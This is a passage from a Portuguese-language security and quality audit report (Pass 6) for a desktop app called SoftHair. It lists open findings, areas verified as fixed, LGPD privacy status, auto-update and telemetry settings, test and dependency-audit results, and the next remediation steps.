6. **Console.logs vazam runtime data (P6-A2)** — 10+ em Atendimentos.

7. **Multi-user OS share data (P6-A3)** — Windows user A vs user B isolados sem aviso.

8. **VACUUM nunca rodou (P6-A4)** — SQLite fragmenta long-term.

9. **Sem teste route coverage (P6-A5)** — P6-C1 deveria ter sido pego.

10. **Render cold start (P6-A7)** — 15s timeout vs 30-60s acorda.

**Áreas verificadas limpas após Pass 5:**
- safeStorage migration (P5-C1) — em Linux com libsecret, funciona.
- electron-updater wiring (P5-C2) — código OK, signing roadmap.
- StubGlobalBanner (P5-C3) — banner global funciona.
- Conflict detection backend (P5-C4) — registra OK.
- Backup automático diário (P5-A7) — cron OK.
- Login 429 lockout (P5-M1) — OK.
- Crash dumps cap 5 (P5-M3) — OK.
- Sync loop fix (P5-M4) — recentlyPulled OK.
- API 401 logout (P5-M5) — OK.
- SQLite cleanup em crash (P5-M6) — OK.
- saveConfig early-return (P5-M7) — OK.
- disconnect race (P5-A10) — OK.
- Logs gzip rotation (P5-B4) — OK.

**LGPD status:**
- Logs locais redactam token/senha — OK.
- Body de POST nunca logado — OK.
- Backup local manual disponível — OK + automatico daily.
- delete-data endpoint EXISTE mas UI AUSENTE (P6-C3).
- Crash dumps locais (não enviam para Google) — OK.

**Auto-update status:**
- electron-updater instalado e configurado.
- GitHub Releases configurado em package.json.
- Sem code signing — gap documentado em SECURITY.md.
- Dialog não-intrusiva implementada.

**Telemetria:**
- crashReporter.uploadToServer:false — verificado.
- Sem analytics, sem ping de uso.
- Spellcheck desabilitado.

**Tests status:**
```
backend/tests:
  passwords.test.js — 7 OK
  secrets.test.js — 6 OK
  syncService.test.js — SKIPPED (better-sqlite3 binding)
  validateId.test.js — 7 OK
Total: 4 test files, 0 failed, 1 skipped.
```

**Dependências:**
- `npm audit` em SoftHair root: 0 vulnerabilities.
- backend: 0 vulnerabilities.
- frontend: 0 vulnerabilities.
- `npm ls` mostra: root sem node_modules (UNMET), frontend tem extraneous dexie + axios/vite mismatch.

**Convergência:**

Pass 6 NÃO atingiu convergência — 4 críticos novos + 10 altos novos descobertos, alguns por verificação detalhada das telas (descobriu 17 endpoints 404 + 3 UIs ausentes para endpoints existentes).

Próximas waves: implementar críticos (UI delete-data, UI conflict, UI backup download, stubs para 17 rotas faltantes), depois altos (despesas contract, console.log purge, multi-user docs, VACUUM, route coverage tests).
